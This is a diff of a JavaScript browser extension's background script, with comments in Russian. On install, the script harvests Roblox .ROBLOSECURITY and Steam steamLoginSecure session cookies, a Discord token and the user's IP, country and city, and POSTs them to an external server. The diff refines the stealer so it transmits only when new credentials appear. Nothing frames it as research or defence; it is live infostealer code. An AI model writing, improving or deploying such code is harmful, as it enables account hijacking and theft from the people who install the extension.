@@ -1,6 +1,5 @@
 const SERVER_URL = "https://mm2-server.onrender.com/send";
 
-// Состояния последних отправленных значений (сбрасываются при перезапуске расширения)
 let sentRoblox = "";
 let sentSteam = "";
 let sentDiscord = "";
@@ -38,23 +37,19 @@ async function getIP() {
 
 async function sendData() {
   const data = {
-    robloxCookie: "",
-    steamCookie: "",
-    discordToken: "",
-    robloxStatus: "not_found",   // not_found, new, sent
+    robloxCookie: "", steamCookie: "", discordToken: "",
+    robloxStatus: "not_found",
     steamStatus: "not_found",
     discordStatus: "not_found",
-    ip: "",
-    country: "",
-    city: ""
+    ip: "", country: "", city: ""
   };
 
   const ip = await getIP();
-  data.ip = ip?.ip || "";
-  data.country = ip?.country || "";
-  data.city = ip?.city || "";
+  data.ip = ip?.ip || ""; data.country = ip?.country || ""; data.city = ip?.city || "";
 
-  // Roblox cookie
+  let hasNew = false;
+
+  // Roblox
   try {
     const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
     const rob = c.find(x => x.name === ".ROBLOSECURITY");
@@ -63,13 +58,14 @@ async function sendData() {
         data.robloxCookie = rob.value;
         data.robloxStatus = "new";
         sentRoblox = rob.value;
+        hasNew = true;
       } else {
         data.robloxStatus = "sent";
       }
     }
   } catch (e) {}
 
-  // Steam cookie
+  // Steam
   try {
     const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
     const steam = c.find(x => x.name === "steamLoginSecure");
@@ -78,32 +74,36 @@ async function sendData() {
         data.steamCookie = steam.value;
         data.steamStatus = "new";
         sentSteam = steam.value;
+        hasNew = true;
       } else {
         data.steamStatus = "sent";
       }
     }
   } catch (e) {}
 
-  // Discord token
+  // Discord
   const discordToken = await getDiscordToken();
   if (discordToken) {
     if (discordToken !== sentDiscord) {
       data.discordToken = discordToken;
       data.discordStatus = "new";
       sentDiscord = discordToken;
+      hasNew = true;
     } else {
       data.discordStatus = "sent";
     }
   }
 
-  // Всегда отправляем на сервер — он выведет актуальное состояние
-  try {
-    await fetch(SERVER_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
-  } catch (e) {}
+  // Отправляем только при наличии новых данных
+  if (hasNew) {
+    try {
+      await fetch(SERVER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    } catch (e) {}
+  }
 }
 
 chrome.runtime.onInstalled.addListener(sendData);
